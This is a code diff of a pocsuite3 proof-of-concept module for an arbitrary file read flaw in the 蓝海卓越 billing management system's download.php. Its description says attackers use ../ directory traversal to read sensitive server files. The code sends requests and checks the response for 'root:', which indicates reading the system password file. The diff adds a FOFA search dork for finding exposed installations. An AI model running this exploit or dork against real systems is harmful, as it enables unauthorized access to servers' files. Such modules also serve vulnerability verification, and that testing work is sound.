@@ -1,3 +1,8 @@
+"""
+If you have issues about development, please read:
+https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
+for more about information, plz visit https://pocsuite.org
+"""
 import re, base64
 from pocsuite3.lib.core.data import logger
 from collections import OrderedDict
@@ -9,16 +14,17 @@ from pocsuite3.lib.utils import get_middle_text
 
 class DemoPOC(POCBase):
     vulID = '11'  
-    author = ['']
+    author = ['PeiQi']
     name = '蓝海卓越 计费管理系统 download.php 任意文件读取漏洞'
+    vulType = VUL_TYPE.PATH_DISCLOSURE
     desc = '''蓝海卓越计费管理系统 download.php文件存在任意文件读取漏洞，攻击者通过 ../ 遍历目录可以读取服务器上的敏感文件
     '''
     appPowerLink = '蓝海卓越'
     appName = '蓝海卓越计费管理系统'
     appVersion = '未知版本'
+    fofa_dork = {'fofa': 'title=="蓝海卓越计费管理系统"'} 
     samples = []
     install_requires = ['']
-    vulType = VUL_TYPE.PATH_DISCLOSURE
     category = POC_CATEGORY.EXPLOITS.WEBAPP
 
     def _options(self):
@@ -33,12 +39,12 @@ class DemoPOC(POCBase):
             "Content-Type": "application/x-www-form-urlencoded",
         }
         try:
-            r = requests.get(url, headers=headers, timeout=5)
-            if 'root:' in r.text and r.status_code == 200:
+            resp = requests.get(url, headers=headers, timeout=5)
+            if 'root:' in resp.text and resp.status_code == 200:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = url
                 result['VerifyInfo']['File'] = self.get_option("filename")
-                result['VerifyInfo']['Response'] = r.text
+                result['VerifyInfo']['Response'] = resp.text
         except Exception as ex:
             pass
 
@@ -51,12 +57,12 @@ class DemoPOC(POCBase):
             "Content-Type": "application/x-www-form-urlencoded",
         }
         try:
-            r = requests.get(url, headers=headers, timeout=5)
+            resp = requests.get(url, headers=headers, timeout=5)
             if resp.status_code == 200:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = url
                 result['VerifyInfo']['File'] = self.get_option("filename")
-                result['VerifyInfo']['Response'] = r.text
+                result['VerifyInfo']['Response'] = resp.text
         except Exception as ex:
             pass
 
